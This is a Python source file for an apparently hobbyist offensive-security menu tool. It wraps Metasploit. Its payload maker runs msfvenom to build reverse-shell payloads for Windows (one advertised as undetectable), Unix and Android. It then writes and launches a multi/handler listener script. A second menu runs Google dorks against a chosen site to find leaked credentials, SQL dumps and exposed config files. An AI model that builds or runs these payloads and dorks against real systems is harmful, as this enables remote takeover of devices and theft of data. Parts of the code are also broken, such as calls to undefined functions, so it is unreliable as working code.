#!/bin/usr/python
# -*- coding: utf-8 -*-

import os
import sys
import time
import colorama
from colorama import Fore, Back, init
import socket
import requests
import os.path
from googlesearch import search

def optiona1():
	os.system("clear")
	print("PLEASE WAIT...")
	os.system("msfconsole")

def optiona22():
	try:
		upgq = raw_input("Do you want to upgrade the packeges? yes/no :")
		if upgq	== "yes":
			os.system("xterm -e sudo apt-get upgrade")
			os.system("clear")
			print("ALL PACKEGES UPDATED, GOING BACK TO THE MAIN MENU")
			time.sleep(2)
			os.system("python page2.py")
		elif upgq == "no":
			os.system("python page2.py")            
		else:
			print("Error, this options ins't valid")
	except KeyboardInterrupt:
		print("Are you sure you want to stop? its really dangerous to stop while updating")
		print("For your safety the process will continue")
		option22()



def optiona2():
	try:
		os.system("clear")
		print("CHECKING FOR UPDATES, PLEASE WAIT")
		os.system("apt-get update")
		os.system("clear")
		print("PACKEGES THAT CAN BE UPGRADED! ")
		upg = os.system("apt list --upgradable")
		optiona22()
	except KeyboardInterrupt:
		print("Are you sure you want to stop? its really dangerous to stop while updating")
		print("For your safety the process will continue")
		time.sleep(2)
		option2()


def optiona3():
	try:
		ncl = input("What port you want to listen? : ")
		os.system("clear")
		os.system('sudo gnome-terminal -x bash -c "echo TYPE ANYTHING HERE TO TEST CONNECTIVITY && nc %s %s" 2> /dev/null | nc -l -p %s'%(host, ncl, ncl))
		os.system("python page2.py")
	except KeyboardInterrupt:
		print("\nListener stoped...")



def optiona4():
	try:
		os.system("clear")
		os.system("figlet PAYLOAD MAKER")
		print("1 -- windows/meterpreter/reverse_tcp (PAYLOAD REVERSE SHELL .EXE)")
		print("2 -- cmd/unix/reverse_python (PAYLOAD REVERSE SHELL .PY)")
		print("3 -- cmd/unix/reverse_bash (PAYLOAD REVERSE SHELL .SH)")
		print("4 -- windows/powershell_reverse_tcp (UNDETECTABLE PAYLOAD REVERSE SHELL .EXE)")
		print("5 -- android/meterpreter/reverse_tcp (PAYLOAD REVERSE SHELL .APK)")
		print("")
		choosemsf = input("Choose one option: ")
		hostmsf = raw_input("Select the local host (%s) : "%address)
		s.close()
		chooseportmsf = input("Select one listen port: ")
		namemsf = raw_input("Select the name of your payload : ")
		listenst = raw_input("Do you want to automatic start listen after the payload is done? yes/no: ")
		
		if choosemsf == 1:
			os.system("clear")
			print("Making your payload... Please wait")
			os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe > %s.exe"%(hostmsf, chooseportmsf, namemsf))
			print(Fore.RED + "DONE !, THE PAYLOAD ITS LOCATED AT STUPIDLAZY FOLDER")
			if listenst == "yes":
				os.system("clear")
				print(Fore.RED + "Starting msfconsole on listen mode")
				os.system("touch meterpreter.rc")
				os.system("echo use exploit/multi/handler >> meterpreter.rc")
				os.system("echo set PAYLOAD windows/meterpreter/reverse_tcp >> meterpreter.rc")
				os.system("echo set LHOST %s >> meterpreter.rc"%hostmsf)
				os.system("echo set LPORT %s >> meterpreter.rc"%chooseportmsf)
				os.system("echo exploit >> meterpreter.rc")
				os.system('sudo gnome-terminal -x bash -c "msfconsole -r meterpreter.rc" 2> /dev/null')
				os.system("rm -rf meterpreter.rc")
				os.system("python page2.py")
			elif listenst == "no":
				menua()
			else:
				os.system("clear")
				print(Fore.RED + "ERROR COULD NOT START MSFCONSOLE, DID YOU TYPED YES/NO RIGTH?")
				time.sleep(2)
				optiona4()
		elif choosemsf == 2:
			os.system("clear")
			print("Making your payload... Please wait")
			os.system("msfvenom -p cmd/unix/reverse_python LHOST=%s LPORT=%s -f raw > %s.py"%(hostmsf, chooseportmsf, namemsf))
			print(Fore.RED + "DONE !, THE PAYLOAD ITS LOCATED AT STUPIDLAZY FOLDER")
			if listenst == "yes":
				os.system("clear")
				print(Fore.RED + "Starting msfconsole on listen mode")
				os.system("touch meterpreter.rc")
				os.system("echo use exploit/multi/handler >> meterpreter.rc")
				os.system("echo set PAYLOAD cmd/unix/reverse_python >> meterpreter.rc")
				os.system("echo set LHOST %s >> meterpreter.rc"%hostmsf)
				os.system("echo set LPORT %s >> meterpreter.rc"%chooseportmsf)
				os.system("echo exploit >> meterpreter.rc")
				os.system('sudo gnome-terminal -x bash -c "msfconsole -r meterpreter.rc" 2> /dev/null')
				os.system("rm -rf meterpreter.rc")
				os.system("python page2.py")
			elif listenst == "no":
				menua()
			else:
				os.system("clear")
				print(Fore.RED + "ERROR COULD NOT START MSFCONSOLE, DID YOU TYPED YES/NO RIGTH?")
				time.sleep(2)
				optiona4()
		elif choosemsf == 3:
			os.system("clear")
			print("Making your payload... Please wait")
			os.system("msfvenom -p cmd/unix/reverse_bash LHOST=%s LPORT=%s -f raw > %s.sh"%(hostmsf, chooseportmsf, namemsf))
			print(Fore.RED + "DONE !, THE PAYLOAD ITS LOCATED AT STUPIDLAZY FOLDER")
			if listenst == "yes":
				os.system("clear")
				print(Fore.RED + "Starting msfconsole on listen mode")
				os.system("touch meterpreter.rc")
				os.system("echo use exploit/multi/handler >> meterpreter.rc")
				os.system("echo set PAYLOAD cmd/unix/reverse_bash >> meterpreter.rc")
				os.system("echo set LHOST %s >> meterpreter.rc"%hostmsf)
				os.system("echo set LPORT %s >> meterpreter.rc"%chooseportmsf)
				os.system("echo exploit >> meterpreter.rc")
				os.system('sudo gnome-terminal -x bash -c "msfconsole -r meterpreter.rc" 2> /dev/null')
				os.system("rm -rf meterpreter.rc")
				os.system("python page2.py")
			elif listenst == "no":
				menua()
			else:
				os.system("clear")
				print(Fore.RED + "ERROR COULD NOT START MSFCONSOLE, DID YOU TYPED YES/NO RIGTH?")
				time.sleep(2)
				optiona4()
		elif choosemsf == 4:
			os.system("clear")
			print("Making your payload... Please wait")
			os.system("msfvenom -p windows/powershell_reverse_tcp LHOST=%s LPORT=%s -f exe > %s.exe"%(hostmsf, chooseportmsf, namemsf))
			print(Fore.RED + "DONE !, THE PAYLOAD ITS LOCATED AT STUPIDLAZY FOLDER")
			if listenst == "yes":
				os.system("clear")
				print(Fore.RED + "Starting msfconsole on listen mode")
				os.system("touch meterpreter.rc")
				os.system("echo use exploit/multi/handler >> meterpreter.rc")
				os.system("echo set PAYLOAD windows/powershell_reverse_tcp >> meterpreter.rc")
				os.system("echo set LHOST %s >> meterpreter.rc"%hostmsf)
				os.system("echo set LPORT %s >> meterpreter.rc"%chooseportmsf)
				os.system("echo exploit >> meterpreter.rc")
				os.system('sudo gnome-terminal -x bash -c "msfconsole -r meterpreter.rc" 2> /dev/null')
				os.system("rm -rf meterpreter.rc")
				os.system("python page2.py")
			elif listenst == "no":
				menua()
			else:
				os.system("clear")
				print(Fore.RED + "ERROR COULD NOT START MSFCONSOLE, DID YOU TYPED YES/NO RIGTH?")
				time.sleep(2)
				optiona4()
		elif choosemsf == 5:
			os.system("clear")
			print("Making your payload... Please wait")
			os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=%s LPORT=%s R > %s.apk"%(hostmsf, chooseportmsf, namemsf))
			print(Fore.RED + "DONE !, THE PAYLOAD ITS LOCATED AT STUPIDLAZY FOLDER")
			if listenst == "yes":
				os.system("clear")
				print(Fore.RED + "Starting msfconsole on listen mode")
				os.system("touch meterpreter.rc")
				os.system("echo use exploit/multi/handler >> meterpreter.rc")
				os.system("echo set PAYLOAD android/meterpreter/reverse_tcp >> meterpreter.rc")
				os.system("echo set LHOST %s >> meterpreter.rc"%hostmsf)
				os.system("echo set LPORT %s >> meterpreter.rc"%chooseportmsf)
				os.system("echo exploit >> meterpreter.rc")
				os.system('sudo gnome-terminal -x bash -c "msfconsole -r meterpreter.rc" 2> /dev/null')
				os.system("rm -rf meterpreter.rc")
				os.system("python page2.py")
			elif listenst == "no":
				menua()
			else:
				os.system("clear")
				print(Fore.RED + "ERROR COULD NOT START MSFCONSOLE, DID YOU TYPED YES/NO RIGTH?")
				time.sleep(2)
				optiona4()

	except KeyboardInterrupt:
		print(Fore.RED + "\nAborting...")
		time.sleep(2)
		os.system("python page2.py")
	except NameError:
		optiona4()


def optiona5():
	try:
		os.system("clear")
		print("Your public ip is %s"%ipub)
		menua()
	except KeyboardInterrupt:
		print("\nStopped")
		time.sleep(2)
		os.system("python page2.py")

def optiona6():
	try:
		os.system("clear")
		os.system("figlet ERROR FIXXER")
		print("1 -- NO FULLSCREEN (VIRTUALBOX) ")
		print("2 -- NO AUDIO")
		print("3 -- WINE ERROR")
		print("4 -- MYSQL ERROR")
		err = input("Select one option please: ")

		if err == 1:
			os.system("clear")
			print("Lets fix this thing")
			time.sleep(2)
			os.system("clear")
			print("Wait while i fix this thing for you <3")
			time.sleep(2)
			os.system("apt-get install virtualbox-guest-x11")
			os.system("apt-get install virtualbox-guest-utils")
			os.system("clear")
			print("I think i fixed it, reboot your vm now, and see i you can full screen.")
			menua()

		elif err == 2:
			os.system("clear")
			print("Lets fix this thing")
			time.sleep(2)
			os.system("clear")
			print("Wait while i fix this thing for you <3")
			time.sleep(2)
			os.system("apt-get pulseaudio")
			os.system("systemctl --user enable pulseaudio && systemctl --user start pulseaudio")
			os.system("clear")
			print("I think i fixed it, reboot your machine now, if not, owo, i tried :/")
			menua()

		elif err == 3:
			os.system("clear")
			print("Lets fix this thing")
			time.sleep(2)
			os.system("clear")
			print("Wait while i fix this thing for you <3")
			time.sleep(2)
			os.system("rm -rf ~/.wine")
			os.system("rm -rf /home/%s/.wine"%user)
			os.system("clear")
			print("Fixed <3")
			menua()

		elif err == 4:
			os.system("clear")
			print("Lets fix this thing")
			time.sleep(2)
			os.system("clear")
			print("Wait while i fix this thing for you <3")
			time.sleep(2)
			os.system("systemctl stop mysql")
			os.system("clear")
			print("I think i fixed it, well, one of the problems that mysql has its fixed lmao")
			menua()
		else:
			print(Fore.RED + "You have to select a valid option.")
			time.sleep(2)
			optiona6()

	except KeyboardInterrupt:
		print(Fore.RED + "\nInterrupt detected")
		menua()


def optiona7():
	os.system("clear")
	os.system("figlet GOOGLE DOCKER")
	print(Fore.RED + "!WEBSITE ONLY!")
	print("1 -- LEAKED CREDENTIALS")
	print("2 -- SENSITIVE INFORMATION")
	print("3 -- SEARCH FOR ARCHIVES")
	print("4 -- SEARCH FOR FOLDERS")
	print("5 -- SENSITIVE DATA FROM MYSQL DUMPS")
	
	gog = input("Select one option please: ")
	wb = raw_input("Target: ")
	alp = raw_input("Show all results? y/n (n = 10 results): ")
	count = 1
	
	if gog == 1:
		if alp == "n":
			wbb = "site:pastebin.com %s"%wb
			os.system("clear")
			for j in search(wbb, tld="co.in", num=10, stop=10, pause=2):
				count +=1
				print(Fore.RED + "LOL LEAKED ! THIS IS THE %s TIME LOL"%count)
				print(j)
		elif alp == "y":
			wbb = "site:pastebin.com %s"%wb
			os.system("clear")
			for j in search(wbb, tld="co.in", num=1000, stop=10, pause=2):
				count +=1
				print(Fore.RED + "LOL LEAKED ! THIS IS THE %s TIME LOL"%count)
				print(j)
	elif gog == 2:
		if alp == "n":
			wbb = 'site:%s ext:txt OR ext:sql OR ext:php OR ext:asp'%wb
			os.system("clear")
			for j in search(wbb, tld="co.in", num=10, stop=10, pause=2):
				count +=1
				print(Fore.RED + "LOL LEAKED ! THIS IS THE %s TIME LOL"%count)
				print(j)
		elif alp == "y":
			wbb = 'site:%s ext:txt OR ext:sql OR ext:php OR ext:asp'%wb
			os.system("clear")
			for j in search(wbb, tld="co.in", num=1000, stop=10, pause=2):
				count +=1
				print(Fore.RED + "LOL LEAKED ! THIS IS THE %s TIME LOL"%count)
				print(j)
	elif gog == 3:
		if alp == "n":
			wbb = 'site:%s intext:"Index of /admin"'%wb
			os.system("clear")
			for j in search(wbb, tld="co.in", num=10, stop=10, pause=2):
				count +=1
				print(Fore.RED + "LOL LEAKED ! THIS IS THE %s TIME LOL"%count)
				print(j)
		elif alp == "y":
			wbb = 'site:%s intext:"Index of /admin"'%wb
			os.system("clear")
			for j in search(wbb, tld="co.in", num=1000, stop=10, pause=2):
				count +=1
				print(Fore.RED + "LOL LEAKED ! THIS IS THE %s TIME LOL"%count)
				print(j)
	elif gog == 4:
		if alp == "n":
			wbb = 'site:%s "index of" "/home/000~ROOT~000/etc"'%wb
			os.system("clear")
			for j in search(wbb, tld="co.in", num=10, stop=10, pause=2):
				count +=1
				print(Fore.RED + "LOL LEAKED ! THIS IS THE %s TIME LOL"%count)
				print(j)
		elif alp == "y":
			wbb = 'site:%s "index of" "/home/000~ROOT~000/etc"'%wb
			os.system("clear")
			for j in search(wbb, tld="co.in", num=1000, stop=10, pause=2):
				count +=1
				print(Fore.RED + "LOL LEAKED ! THIS IS THE %s TIME LOL"%count)
				print(j)
	elif gog == 5:
		if alp == "n":
			wbb = 'site:%s intitle:"index of" mysql.conf OR mysql_config OR dump.sql OR dump.txt'%wb
			os.system("clear")
			for j in search(wbb, tld="co.in", num=10, stop=10, pause=2):
				count +=1
				print(Fore.RED + "LOL LEAKED ! THIS IS THE %s TIME LOL"%count)
				print(j)
		elif alp == "y":
			wbb = 'site:%s intitle:"index of" mysql.conf OR mysql_config OR dump.sql OR dump.txt'%wb
			os.system("clear")
			for j in search(wbb, tld="co.in", num=1000, stop=10, pause=2):
				count +=1
				print(Fore.RED + "LOL LEAKED ! THIS IS THE %s TIME LOL"%count)
				print(j)
	
	print(Fore.RED + "DONE !")
	print(Fore.RED + "If nothing showed up its because no results to that dork was found :(")
	menua()

def menua():
	try:
		wmenu = raw_input(RED + "You want to go back to the main menu? yes/no : " + RESET)
		if (wmenu == "yes"):
			os.system("python page2.py")
		elif (wmenu == "no"):
			os.system("python stupidlazy.py")
		else:
			print("You have to answer with yes or no ! ")
			menua()
	except KeyboardInterrupt:
		os.system("python stupidlazy.py")

user = os.getlogin()
host = socket.gethostname()
ip = socket.gethostbyname(host)
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(('8.8.8.8', 1))
address = s.getsockname()[0]
f = requests.request('GET', 'http://myip.dnsomatic.com')
ipub = f.text
RED = '\033[31m'
RESET = '\033[0m'
colorama.init(autoreset=True)

try:
	os.system("clear")
	os.system("figlet PAGE2")
	print("")
	print("1 -- START MSFCONSOLE			    2 -- AUTOMATIC UPDATE YOU MACHINE")
	print("3 -- TEST CONNECTIVITY WITH NETCAT  	    4 -- MAKE A PAYLOAD")
	print("5 -- VIEW PUBLIC IP ADDRESS		    6 -- FIX ERRORS")
	print("7 -- GOOGLE DORKING			    100 -- GO BACK TO STUPIDLAZY")
	print("")
	choose = input("Select one option : ")

	if choose == 1:
		optiona1()
		os.system("python page2.py")

	elif choose == 2:
		optiona2()
		
	elif choose == 3:
		optiona3()

	elif choose == 4:
		optiona4()

	elif choose == 5:
		optiona5()

	elif choose == 6:
		optiona6()

	elif choose == 7:
		optiona7()

	elif choose == 100:
		os.system("python stupidlazy.py")
		
	else:
		print(RED + "This option does not exists !" + RESET)
		menua()

except KeyboardInterrupt:
	os.system("python stupidlazy.py")
